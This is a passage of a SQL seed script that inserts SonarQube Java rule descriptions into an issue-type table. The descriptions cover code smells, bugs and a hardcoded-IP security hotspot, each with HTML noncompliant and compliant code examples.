  <li> ... </li>
</ul>
<p>Like for <code>System.gc()</code>, there is no reason to manually call <code>runFinalization()</code> to force the call of finalization methods of
any objects pending finalization.</p>
<p>An application relying on these unpredictable methods is also unpredictable and therefore broken. The task of running the garbage collector and
calling <code>finalize()</code> methods should be left exclusively to the JVM.</p>', 'java', 'READY', 'CRITICAL', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S1217', '"Thread.run()" should not be called directly', 'sonarqube', 'Bug', '<p>The purpose of the <code>Thread.run()</code> method is to execute code in a separate, dedicated thread. Calling this method directly doesn''t make
sense because it causes its code to be executed in the current thread. </p>
<p>To get the expected behavior, call the <code>Thread.start()</code> method instead.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Thread myThread = new Thread(runnable);
myThread.run(); // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
Thread myThread = new Thread(runnable);
myThread.start(); // Compliant
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/572.html">MITRE, CWE-572</a> - Call to Thread run() instead of start() </li>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/6DdGBQ">CERT THI00-J.</a> - Do not invoke Thread.run() </li>
</ul>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S1219', '"switch" statements should not contain non-case labels', 'sonarqube', 'Code Smell', '<p>Even if it is legal, mixing case and non-case labels in the body of a switch statement is very confusing and can even be the result of a typing
error.</p>
<h2>Noncompliant Code Example</h2>
<pre>
switch (day) {
  case MONDAY:
  case TUESDAY:
  WEDNESDAY:   // Noncompliant; syntactically correct, but behavior is not what''s expected
    doSomething();
    break;
  ...
}

switch (day) {
  case MONDAY:
    break;
  case TUESDAY:
    foo:for(int i = 0 ; i &lt; X ; i++) {  // Noncompliant; the code is correct and behaves as expected but is barely readable
         /* ... */
        break foo;  // this break statement doesn''t relate to the nesting case TUESDAY
         /* ... */
    }
    break;
    /* ... */
}
</pre>
<h2>Compliant Solution</h2>
<pre>
switch (day) {
  case MONDAY:
  case TUESDAY:
  case WEDNESDAY:
    doSomething();
    break;
  ...
}

switch (day) {
  case MONDAY:
    break;
  case TUESDAY:
    compute(args); // put the content of the labelled "for" statement in a dedicated method
    break;

    /* ... */
}
</pre>', 'java', 'READY', 'BLOCKER', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S122', 'Statements should be on separate lines', 'sonarqube', 'Code Smell', '<p>For better readability, do not put more than one statement on a single line.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if(someCondition) doSomething();
</pre>
<h2>Compliant Solution</h2>
<pre>
if(someCondition) {
  doSomething();
}
</pre>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S1220', 'The default unnamed package should not be used', 'sonarqube', 'Code Smell', '<p>According to the Java Language Specification:</p>
<blockquote>
  <p>Unnamed packages are provided by the Java platform principally for convenience when developing small or temporary applications or when just
  beginning development.</p>
</blockquote>
<p>To enforce this best practice, classes located in default package can no longer be accessed from named ones since Java 1.4.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class MyClass { /* ... */ }
</pre>
<h2>Compliant Solution</h2>
<pre>
package org.example;

public class MyClass{ /* ... */ }
</pre>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S1221', 'Methods should not be named "tostring", "hashcode" or "equal"', 'sonarqube', 'Bug', '<p>Naming a method <code>tostring</code>, <code>hashcode</code> or <code>equal</code> is either:</p>
<ul>
  <li> A bug in the form of a typo. Overriding <code>toString</code>, <code>Object.hashCode()</code> (note the camelCasing) or
  <code>Object.equals</code> (note the ''s'' on the end) was meant, and the application does not behave as expected. </li>
  <li> Done on purpose. The name however will confuse every other developer, who may not notice the naming difference, or who will think it is a bug.
  </li>
</ul>
<p>In both cases, the method should be renamed.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public int hashcode() { /* ... */ }  // Noncompliant

public String tostring() { /* ... */ } // Noncompliant

public boolean equal(Object obj) { /* ... */ }  // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
@Override
public int hashCode() { /* ... */ }

@Override
public String toString() { /* ... */ }

@Override
public boolean equals(Object obj) { /* ... */ }
</pre>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S1223', 'Non-constructor methods should not have the same name as the enclosing class', 'sonarqube', 'Code Smell', '<p>Having a class and some of its methods sharing the same name is misleading, and leaves others to wonder whether it was done that way on purpose, or
was the methods supposed to be a constructor.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class Foo {
   public Foo() {...}
   public void Foo(String label) {...}  // Noncompliant
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class Foo {
   public Foo() {...}
   public void foo(String label) {...}  // Compliant
}
</pre>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S1226', 'Method parameters, caught exceptions and foreach variables'' initial values should not be ignored', 'sonarqube', 'Bug', '<p>While it is technically correct to assign to parameters from within method bodies, doing so before the parameter value is read is likely a bug.
Instead, initial values of parameters, caught exceptions, and foreach parameters should be, if not treated as <code>final</code>, then at least read
before reassignment.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public void doTheThing(String str, int i, List&lt;String&gt; strings) {
  str = Integer.toString(i); // Noncompliant

  for (String s : strings) {
    s = "hello world"; // Noncompliant
  }
}
</pre>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S1228', 'Packages should have a javadoc file ''package-info.java''', 'sonarqube', 'Code Smell', '<p>Each package in a Java project should include a <code>package-info.java</code> file. The purpose of this file is to document the Java package using
javadoc and declare package annotations.</p>
<h2>Compliant Solution</h2>
<pre>
/**
* This package has non null parameters and is documented.
**/
@ParametersAreNonnullByDefault
package org.foo.bar;
</pre>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S1244', 'Floating point numbers should not be tested for equality', 'sonarqube', 'Bug', '<p>Floating point math is imprecise because of the challenges of storing such values in a binary representation. Even worse, floating point math is
not associative; push a <code>float</code> or a <code>double</code> through a series of simple mathematical operations and the answer will be
different based on the order of those operation because of the rounding that takes place at each step.</p>
<p>Even simple floating point assignments are not simple:</p>
<pre>
float f = 0.1; // 0.100000001490116119384765625
double d = 0.1; // 0.1000000000000000055511151231257827021181583404541015625
</pre>
<p>(Results will vary based on compiler and compiler settings);</p>
<p>Therefore, the use of the equality (<code>==</code>) and inequality (<code>!=</code>) operators on <code>float</code> or <code>double</code> values
is almost always an error. Instead the best course is to avoid floating point comparisons altogether. When that is not possible, you should consider
using one of Java''s float-handling <code>Numbers</code> such as <code>BigDecimal</code> which can properly handle floating point comparisons. A third
option is to look not for equality but for whether the value is close enough. I.e. compare the absolute value of the difference between the stored
value and the expected value against a margin of acceptable error. Note that this does not cover all cases (<code>NaN</code> and <code>Infinity</code>
for instance).</p>
<p>This rule checks for the use of direct and indirect equality/inequailty tests on floats and doubles.</p>
<h2>Noncompliant Code Example</h2>
<pre>
float myNumber = 3.146;
if ( myNumber == 3.146f ) { //Noncompliant. Because of floating point imprecision, this will be false
  // ...
}
if ( myNumber != 3.146f ) { //Noncompliant. Because of floating point imprecision, this will be true
  // ...
}

if (myNumber &lt; 4 || myNumber &gt; 4) { // Noncompliant; indirect inequality test
  // ...
}

float zeroFloat = 0.0f;
if (zeroFloat == 0) {  // Noncompliant. Computations may end up with a value close but not equal to zero.
}
</pre>
<h2>Exceptions</h2>
<p>Since <code>NaN</code> is not equal to itself, the specific case of testing a floating point value against itself is a valid test for
<code>NaN</code> and is therefore ignored. Though using <code>Double.isNaN</code> method should be preferred instead, as intent is more explicit.</p>
<pre>
float f;
double d;
if(f != f) { // Compliant; test for NaN value
  System.out.println("f is NaN");
} else if (f != d) { // Noncompliant
  // ...
}
</pre>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S125', 'Sections of code should not be commented out', 'sonarqube', 'Code Smell', '<p>Programmers should not comment out code as it bloats programs and reduces readability.</p>
<p>Unused code should be deleted and can be retrieved from source control history if required.</p>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S1258', 'Classes and enums with private members should have a constructor', 'sonarqube', 'Code Smell', '<p>Non-abstract classes and enums with non-<code>static</code>, <code>private</code> members should explicitly initialize those members, either in a
constructor or with a default value.</p>
<h2>Noncompliant Code Example</h2>
<pre>
class A { // Noncompliant
  private int field;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
class A {
  private int field;

  A(int field) {
    this.field = field;
  }
}
</pre>
<h2>Exceptions</h2>
<ul>
  <li> Class implementing a Builder Pattern (name ending with "Builder"). </li>
  <li> <a href="https://docs.oracle.com/javaee/7/tutorial/index.html">Java EE</a> class annotated with:
    <ul>
      <li> <a href="https://docs.oracle.com/javaee/7/api/javax/annotation/ManagedBean.html">ManagedBean</a> </li>
      <li> <a href="https://docs.oracle.com/javaee/7/api/javax/ejb/MessageDriven.html">MessageDriven</a> </li>
      <li> <a href="https://docs.oracle.com/javaee/7/api/javax/ejb/Singleton.html">Singleton</a> </li>
      <li> <a href="https://docs.oracle.com/javaee/7/api/javax/ejb/Stateful.html">Stateful</a> </li>
      <li> <a href="https://docs.oracle.com/javaee/7/api/javax/ejb/Stateless.html">Stateless</a> </li>
      <li> <a href="https://docs.oracle.com/javaee/7/api/javax/jws/WebService.html">WebService</a> </li>
      <li> <a href="https://docs.oracle.com/javaee/7/api/javax/servlet/annotation/WebFilter.html">WebFilter</a> </li>
      <li> <a href="https://docs.oracle.com/javaee/7/api/javax/servlet/annotation/WebServlet.html">WebServlet</a> </li>
    </ul> </li>
  <li> Class and field annotated with:
    <ul>
      <li> <a href="https://codehaus-plexus.github.io/plexus-containers/plexus-component-annotations/index.html">Plexus Component Annotations</a>
      </li>
      <li> <a href="https://maven.apache.org/developers/mojo-api-specification.html">Maven Mojo</a> </li>
    </ul> </li>
  <li> Field annotated with:
    <ul>
      <li> <a href="https://docs.oracle.com/javaee/7/api/javax/annotation/Resource.html">Resource</a> </li>
      <li> <a href="https://docs.oracle.com/javaee/7/api/javax/ejb/EJB.html">EJB</a> </li>
      <li> <a href="https://docs.oracle.com/javaee/7/api/javax/inject/Inject.html">Inject</a> </li>
      <li> <a
      href="https://docs.spring.io/spring-framework/docs/current/javadoc-api/org/springframework/beans/factory/annotation/Autowired.html">Autowired</a> </li>
    </ul> </li>
</ul>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S126', '"if ... else if" constructs should end with "else" clauses', 'sonarqube', 'Code Smell', '<p>This rule applies whenever an <code>if</code> statement is followed by one or more <code>else if</code> statements; the final <code>else if</code>
should be followed by an <code>else</code> statement.</p>
<p>The requirement for a final <code>else</code> statement is defensive programming.</p>
<p>The <code>else</code> statement should either take appropriate action or contain a suitable comment as to why no action is taken. This is
consistent with the requirement to have a final <code>default</code> clause in a <code>switch</code> statement.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if (x == 0) {
  doSomething();
} else if (x == 1) {
  doSomethingElse();
}
</pre>
<h2>Compliant Solution</h2>
<pre>
if (x == 0) {
  doSomething();
} else if (x == 1) {
  doSomethingElse();
} else {
  throw new IllegalStateException();
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/RtYxBQ">CERT, MSC01-C.</a> - Strive for logical completeness </li>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/jzZGBQ">CERT, MSC57-J.</a> - Strive for logical completeness </li>
</ul>', 'java', 'READY', 'CRITICAL', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S1264', 'A "while" loop should be used instead of a "for" loop', 'sonarqube', 'Code Smell', '<p>When only the condition expression is defined in a <code>for</code> loop, and the initialization and increment expressions are missing, a
<code>while</code> loop should be used instead to increase readability. </p>
<h2>Noncompliant Code Example</h2>
<pre>
for (;condition;) { /*...*/ }
</pre>
<h2>Compliant Solution</h2>
<pre>
while (condition) { /*...*/ }
</pre>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S127', '"for" loop stop conditions should be invariant', 'sonarqube', 'Code Smell', '<p>A <code>for</code> loop stop condition should test the loop counter against an invariant value (i.e. one that is true at both the beginning and
ending of every loop iteration). Ideally, this means that the stop condition is set to a local variable just before the loop begins. </p>
<p>Stop conditions that are not invariant are slightly less efficient, as well as being difficult to understand and maintain, and likely lead to the
introduction of errors in the future.</p>
<p>This rule tracks three types of non-invariant stop conditions:</p>
<ul>
  <li> When the loop counters are updated in the body of the <code>for</code> loop </li>
  <li> When the stop condition depend upon a method call </li>
  <li> When the stop condition depends on an object property, since such properties could change during the execution of the loop. </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
for (int i = 0; i &lt; 10; i++) {
  ...
  i = i - 1; // Noncompliant; counter updated in the body of the loop
  ...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
for (int i = 0; i &lt; 10; i++) {...}
</pre>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S128', 'Switch cases should end with an unconditional "break" statement', 'sonarqube', 'Code Smell', '<p>When the execution is not explicitly terminated at the end of a switch case, it continues to execute the statements of the following case. While
this is sometimes intentional, it often is a mistake which leads to unexpected behavior. </p>
<h2>Noncompliant Code Example</h2>
<pre>
switch (myVariable) {
  case 1:
    foo();
    break;
  case 2:  // Both ''doSomething()'' and ''doSomethingElse()'' will be executed. Is it on purpose ?
    doSomething();
  default:
    doSomethingElse();
    break;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
switch (myVariable) {
  case 1:
    foo();
    break;
  case 2:
    doSomething();
    break;
  default:
    doSomethingElse();
    break;
}
</pre>
<h2>Exceptions</h2>
<p>This rule is relaxed in the following cases:</p>
<pre>
switch (myVariable) {
  case 0:                                // Empty case used to specify the same behavior for a group of cases.
  case 1:
    doSomething();
    break;
  case 2:                                // Use of return statement
    return;
  case 3:                                // Use of throw statement
    throw new IllegalStateException();
  case 4:                                // Use of continue statement
    continue;
  default:                               // For the last case, use of break statement is optional
    doSomethingElse();
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/484.html">MITRE, CWE-484</a> - Omitted Break Statement in Switch </li>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/ldYxBQ">CERT, MSC17-C.</a> - Finish every set of statements associated with a case label with a
  break statement </li>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/1DdGBQ">CERT, MSC52-J.</a> - Finish every set of statements associated with a case label with a
  break statement </li>
</ul>', 'java', 'READY', 'BLOCKER', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S1301', '"switch" statements should have at least 3 "case" clauses', 'sonarqube', 'Code Smell', '<p><code>switch</code> statements are useful when there are many different cases depending on the value of the same expression.</p>
<p>For just one or two cases however, the code will be more readable with <code>if</code> statements.</p>
<h2>Noncompliant Code Example</h2>
<pre>
switch (variable) {
  case 0:
    doSomething();
    break;
  default:
    doSomethingElse();
    break;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
if (variable == 0) {
  doSomething();
} else {
  doSomethingElse();
}
</pre>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S1309', 'Track uses of "@SuppressWarnings" annotations', 'sonarqube', 'Code Smell', '<p>This rule allows you to track the usage of the <code>@SuppressWarnings</code> mechanism.</p>
<h2>Noncompliant Code Example</h2>
<p>With a parameter value of "unused" :</p>
<pre>
@SuppressWarnings("unused")
@SuppressWarnings("unchecked")  // Noncompliant
</pre>', 'java', 'READY', 'INFO', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S131', '"switch" statements should have "default" clauses', 'sonarqube', 'Code Smell', '<p>The requirement for a final <code>default</code> clause is defensive programming. The clause should either take appropriate action, or contain a
suitable comment as to why no action is taken.</p>
<h2>Noncompliant Code Example</h2>
<pre>
switch (param) {  //missing default clause
  case 0:
    doSomething();
    break;
  case 1:
    doSomethingElse();
    break;
}

switch (param) {
  default: // default clause should be the last one
    error();
    break;
  case 0:
    doSomething();
    break;
  case 1:
    doSomethingElse();
    break;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
switch (param) {
  case 0:
    doSomething();
    break;
  case 1:
    doSomethingElse();
    break;
  default:
    error();
    break;
}
</pre>
<h2>Exceptions</h2>
<p>If the <code>switch</code> parameter is an <code>Enum</code> and if all the constants of this enum are used in the <code>case</code> statements,
then no <code>default</code> clause is expected.</p>
<p>Example:</p>
<pre>
public enum Day {
    SUNDAY, MONDAY
}
...
switch(day) {
  case SUNDAY:
    doSomething();
    break;
  case MONDAY:
    doSomethingElse();
    break;
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/478.html">MITRE, CWE-478</a> - Missing Default Case in Switch Statement </li>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/RtYxBQ">CERT, MSC01-C.</a> - Strive for logical completeness </li>
</ul>', 'java', 'READY', 'CRITICAL', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S1310', 'Track uses of "NOPMD" suppression comments', 'sonarqube', 'Code Smell', '<p>This rule allows you to track the use of the PMD suppression comment mechanism. </p>
<h2>Noncompliant Code Example</h2>
<pre>
// NOPMD
</pre>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S1311', 'Cyclomatic Complexity of classes should not be too high', 'sonarqube', 'Code Smell', '<p>The Cyclomatic Complexity is measured by the number of <code>&amp;&amp;</code> and <code>||</code> operators and <code>if</code>,
<code>while</code>, <code>do</code>, <code>for</code>, <code>?:</code>, <code>catch</code>, <code>switch</code>, <code>case</code>,
<code>return</code> and <code>throw</code> statements in the body of a class plus one for each constructor, method, static initializer, or instance
initializer in the class. The last return statement in method, if exists, is not taken into account.</p>
<p>Even when the Cyclomatic Complexity of a class is very high, this complexity might be well distributed among all methods. Nevertheless, most of the
time, a very complex class is a class which breaks the Single Responsibility Principle and which should be re-factored to be split in several
classes.</p>
<h2>Deprecated</h2>
<p>This rule is deprecated, and will eventually be removed.</p>', 'java', 'DEPRECATED', 'CRITICAL', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S1312', 'Loggers should be "private static final" and should share a naming convention', 'sonarqube', 'Code Smell', '<p>Regardless of the logging framework in use (logback, log4j, commons-logging, java.util.logging, ...), loggers should be:</p>
<ul>
  <li> <code>private</code>: never be accessible outside of its parent class. If another class needs to log something, it should instantiate its own
  logger. </li>
  <li> <code>static</code>: not be dependent on an instance of a class (an object). When logging something, contextual information can of course be
  provided in the messages but the logger should be created at class level to prevent creating a logger along with each object. </li>
  <li> <code>final</code>: be created once and only once per class. </li>
</ul>
<h2>Noncompliant Code Example</h2>
<p>With a default regular expression of <code>LOG(?:GER)?</code>:</p>
<pre>
public Logger logger = LoggerFactory.getLogger(Foo.class);  // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
private static final Logger LOGGER = LoggerFactory.getLogger(Foo.class);
</pre>
<h2>Exceptions</h2>
<p>Variables of type <code>org.apache.maven.plugin.logging.Log</code> are ignored.</p>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S1313', 'Using hardcoded IP addresses is security-sensitive', 'sonarqube', 'Security Hotspot', '<p>Hardcoding IP addresses is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-5901">CVE-2006-5901</a> </li>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-3725">CVE-2005-3725</a> </li>
</ul>
<p>Today''s services have an ever-changing architecture due to their scaling and redundancy needs. It is a mistake to think that a service will always
have the same IP address. When it does change, the hardcoded IP will have to be modified too. This will have an impact on the product development,
delivery, and deployment:</p>
<ul>
  <li> The developers will have to do a rapid fix every time this happens, instead of having an operation team change a configuration file. </li>
  <li> It misleads to use the same address in every environment (dev, sys, qa, prod). </li>
</ul>
<p>Last but not least it has an effect on application security. Attackers might be able to decompile the code and thereby discover a potentially
sensitive address. They can perform a Denial of Service attack on the service, try to get access to the system, or try to spoof the IP address to
bypass security checks. Such attacks can always be possible, but in the case of a hardcoded IP address solving the issue will take more time, which
will increase an attack''s impact.</p>
<h2>Ask Yourself Whether</h2>
<p>The disclosed IP address is sensitive, e.g.:</p>
<ul>
  <li> Can give information to an attacker about the network topology. </li>
  <li> It''s a personal (assigned to an identifiable person) IP address. </li>
</ul>
<p>There is a risk if you answered yes to any of these questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Don''t hard-code the IP address in the source code, instead make it configurable with environment variables, configuration files, or a similar
approach. Alternatively, if confidentially is not required a domain name can be used since it allows to change the destination quickly without having
to rebuild the software.</p>
<h2>Sensitive Code Example</h2>
<pre>
String ip = "192.168.12.42"; // Sensitive
Socket socket = new Socket(ip, 6667);
</pre>
<h2>Compliant Solution</h2>
<pre>
String ip = System.getenv("IP_ADDRESS"); // Compliant
Socket socket = new Socket(ip, 6667);
</pre>
<h2>Exceptions</h2>
<p>No issue is reported for the following cases because they are not considered sensitive:</p>
<ul>
  <li> Loopback addresses 127.0.0.0/8 in CIDR notation (from 127.0.0.0 to 127.255.255.255) </li>
  <li> Broadcast address 255.255.255.255 </li>
  <li> Non routable address 0.0.0.0 </li>
  <li> Strings of the form <code>2.5.&lt;number&gt;.&lt;number&gt;</code> as they <a href="http://www.oid-info.com/introduction.htm">often match
  Object Identifiers</a> (OID). </li>
</ul>
<h2>See</h2>
<ul>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A3-Sensitive_Data_Exposure">OWASP Top 10 2017 Category A3</a> - Sensitive Data Exposure
  </li>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/OjdGBQ">CERT, MSC03-J.</a> - Never hard code sensitive information </li>
</ul>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S1314', 'Octal values should not be used', 'sonarqube', 'Code Smell', '<p>Integer literals starting with a zero are octal rather than decimal values. While using octal values is fully supported, most developers do not
have experience with them. They may not recognize octal values as such, mistaking them instead for decimal values.</p>
<h2>Noncompliant Code Example</h2>
<pre>
int myNumber = 010; // Noncompliant. myNumber will hold 8, not 10 - was this really expected?
</pre>
<h2>Compliant Solution</h2>
<pre>
int myNumber = 8;
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/atYxBQ">CERT, DCL18-C.</a> - Do not begin integer constants with 0 when specifying a decimal
  value </li>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/7DZGBQ">CERT, DCL50-J.</a> - Use visually distinct identifiers </li>
</ul>', 'java', 'READY', 'BLOCKER', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S1315', 'Track uses of "CHECKSTYLE:OFF" suppression comments', 'sonarqube', 'Code Smell', '<p>This rule allows you to track the use of the Checkstyle suppression comment mechanism. </p>
<h2>Noncompliant Code Example</h2>
<pre>
// CHECKSTYLE:OFF
</pre>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S1317', '"StringBuilder" and "StringBuffer" should not be instantiated with a character', 'sonarqube', 'Bug', '<p>Instantiating a <code>StringBuilder</code> or a <code>StringBuffer</code> with a character is misleading because most Java developers would expect
the character to be the initial value of the <code>StringBuffer</code>. </p>
<p>What actually happens is that the int representation of the character is used to determine the initial size of the <code>StringBuffer</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
StringBuffer foo = new StringBuffer(''x'');   //equivalent to StringBuffer foo = new StringBuffer(120);
</pre>
<h2>Compliant Solution</h2>
<pre>
StringBuffer foo = new StringBuffer("x");
</pre>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S1319', 'Declarations should use Java collection interfaces such as "List" rather than specific implementation classes such as "LinkedList"', 'sonarqube', 'Code Smell', '<p>The purpose of the Java Collections API is to provide a well defined hierarchy of interfaces in order to hide implementation details.</p>
<p>Implementing classes must be used to instantiate new collections, but the result of an instantiation should ideally be stored in a variable whose
type is a Java Collection interface.</p>
<p>This rule raises an issue when an implementation class:</p>
<ul>
  <li> is returned from a <code>public</code> method. </li>
  <li> is accepted as an argument to a <code>public</code> method. </li>
  <li> is exposed as a <code>public</code> member. </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
public class Employees {
  private HashSet&lt;Employee&gt; employees = new HashSet&lt;Employee&gt;();  // Noncompliant - "employees" should have type "Set" rather than "HashSet"

  public HashSet&lt;Employee&gt; getEmployees() {                       // Noncompliant
    return employees;
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class Employees {
  private Set&lt;Employee&gt; employees = new HashSet&lt;Employee&gt;();      // Compliant

  public Set&lt;Employee&gt; getEmployees() {                           // Compliant
    return employees;
  }
}
</pre>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S134', 'Control flow statements "if", "for", "while", "switch" and "try" should not be nested too deeply', 'sonarqube', 'Code Smell', '<p>Nested <code>if</code>, <code>for</code>, <code>while</code>, <code>switch</code>, and <code>try</code> statements are key ingredients for making
what''s known as "Spaghetti code".</p>
<p>Such code is hard to read, refactor and therefore maintain.</p>
<h2>Noncompliant Code Example</h2>
<p>With the default threshold of 3:</p>
<pre>
if (condition1) {                  // Compliant - depth = 1
  /* ... */
  if (condition2) {                // Compliant - depth = 2
    /* ... */
    for(int i = 0; i &lt; 10; i++) {  // Compliant - depth = 3, not exceeding the limit
      /* ... */
      if (condition4) {            // Noncompliant - depth = 4
        if (condition5) {          // Depth = 5, exceeding the limit, but issues are only reported on depth = 4
          /* ... */
        }
        return;
      }
    }
  }
}
</pre>', 'java', 'READY', 'CRITICAL', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S135', 'Loops should not contain more than a single "break" or "continue" statement', 'sonarqube', 'Code Smell', '<p>Restricting the number of <code>break</code> and <code>continue</code> statements in a loop is done in the interest of good structured programming.
</p>
<p>Only one <code>break</code> or one <code>continue</code> statement is acceptable in a loop, since it facilitates optimal coding. If there is more
than one, the code should be refactored to increase readability.</p>
<h2>Noncompliant Code Example</h2>
<pre>
for (int i = 1; i &lt;= 10; i++) {     // Noncompliant - 2 continue - one might be tempted to add some logic in between
  if (i % 2 == 0) {
    continue;
  }

  if (i % 3 == 0) {
    continue;
  }

  System.out.println("i = " + i);
}
</pre>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S138', 'Methods should not have too many lines', 'sonarqube', 'Code Smell', '<p>A method that grows too large tends to aggregate too many responsibilities. Such method inevitably become harder to understand and therefore harder
to maintain.</p>
<p>Above a specific threshold, it is strongly advised to refactor into smaller methods which focus on well-defined tasks. Those smaller methods will
not only be easier to understand, but also probably easier to test.</p>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S139', 'Comments should not be located at the end of lines of code', 'sonarqube', 'Code Smell', '<p>This rule verifies that single-line comments are not located at the ends of lines of code. The main idea behind this rule is that in order to be
really readable, trailing comments would have to be properly written and formatted (correct alignment, no interference with the visual structure of
the code, not too long to be visible) but most often, automatic code formatters would not handle this correctly: the code would end up less readable.
Comments are far better placed on the previous empty line of code, where they will always be visible and properly formatted.</p>
<h2>Noncompliant Code Example</h2>
<pre>
int a1 = b + c; // This is a trailing comment that can be very very long
</pre>
<h2>Compliant Solution</h2>
<pre>
// This very long comment is better placed before the line of code
int a2 = b + c;
</pre>', 'java', 'READY', 'MINOR', 'BLOCK');
